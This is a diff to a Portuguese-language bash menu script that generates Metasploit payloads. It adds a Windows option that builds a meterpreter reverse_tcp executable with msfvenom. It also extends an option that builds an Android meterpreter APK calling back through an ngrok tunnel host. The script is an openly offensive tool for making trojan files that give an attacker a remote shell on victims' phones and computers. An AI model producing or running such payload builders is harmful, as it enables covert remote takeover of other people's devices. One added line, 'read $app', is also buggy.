@@ -22,7 +22,8 @@ echo "*---------------------------------------------------*"
 date
 echo -e "${CYAN}*******************************************************************************"
 echo -e "${RED}** [1]- REDE INTERNA  **"   "${PRETO} ***ANDROID***                            "
-echo -e "${RED}** [2]- REDE EXTERNA  **"  "${PRETO}  ***ANDROID***                           " 
+echo -e "${RED}** [2]- REDE EXTERNA  **"   "${PRETO}  ***ANDROID***                           "
+echo -e "${RED}** [3]- REDE INTERNA ** "   "${PRETO}  ***WINDOWS***                           " 
 echo -e "${CYAN}*******************************************************************************"
 echo "[*]qual opcao deseja executar[*]?"
 read opcao
@@ -33,7 +34,7 @@ if [ "$opcao" -eq "1" ]
 then
 clear
 echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "           CRIACAO DO PAYLOAD          * "
+echo "           CRIACAO DO PAYLOAD*AND*          * "
 echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 echo "AGUARDE!"
 sleep 3
@@ -66,7 +67,7 @@ if [ "$opcao" -eq "2" ]
 then
 clear
 echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "           CRIACAO DO PAYLOAD          * "
+echo "           CRIACAO DO PAYLOAD[AND]          * "
 echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 echo "AGUARDE!"
 sleep 3
@@ -95,6 +96,8 @@ echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 else
 echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU"
 read port
+echo "digite o nome do apk"
+read $app
 echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port R > $app.apk
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
@@ -103,4 +106,25 @@ echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 fi
 fi
-
+if [ "$opcao" -eq "3" ]
+then
+clear
+echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
+echo "           CRIACAO DO PAYLOAD*WIN*    * "
+echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
+echo -e "${CYAN}AGUARDE!"
+sleep 3
+clear
+echo "[*]digite seu ip interno[ETH0]"
+read ipp
+echo "digite a porta aberta"
+read portw
+echo "digite o nome do executavel"
+read exe
+echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$portw  -f exe > $exe.exe
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
+echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+fi
